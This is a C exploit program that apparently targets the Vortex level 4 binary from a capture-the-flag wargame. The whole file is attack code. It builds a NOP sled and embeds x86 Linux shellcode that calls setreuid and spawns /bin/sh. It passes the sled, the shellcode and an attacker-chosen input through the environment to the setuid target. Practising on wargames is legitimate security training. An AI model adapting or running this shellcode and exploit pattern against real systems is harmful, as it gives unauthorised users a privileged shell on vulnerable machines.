#include<unistd.h>
#include<stdio.h>
#include<string.h>
#include<stdlib.h>

int main(int argc, char* argv[])
{
  if (argc < 2) {
      fprintf(stderr, "Usage: %s <input>\n", argv[0]);
      return 1;
  }
  char* input = strdup(argv[1]);
  if (input == NULL) {
        perror("strdup");
        return 1;
  }

  char *shellcode =
          "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
          "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

  char sh[600];
  char NOP = '\x90';
  int nops = 500;

  memset(sh, NOP, nops);
  memcpy(sh+nops, shellcode, strlen(shellcode));

  char *argv_in[]={ NULL };
  char *envp[] = {"", input,sh, NULL};

  printf("in caller\n");
  execve("/vortex/vortex4", argv_in, envp);

  printf("after\n");
  return 0;
}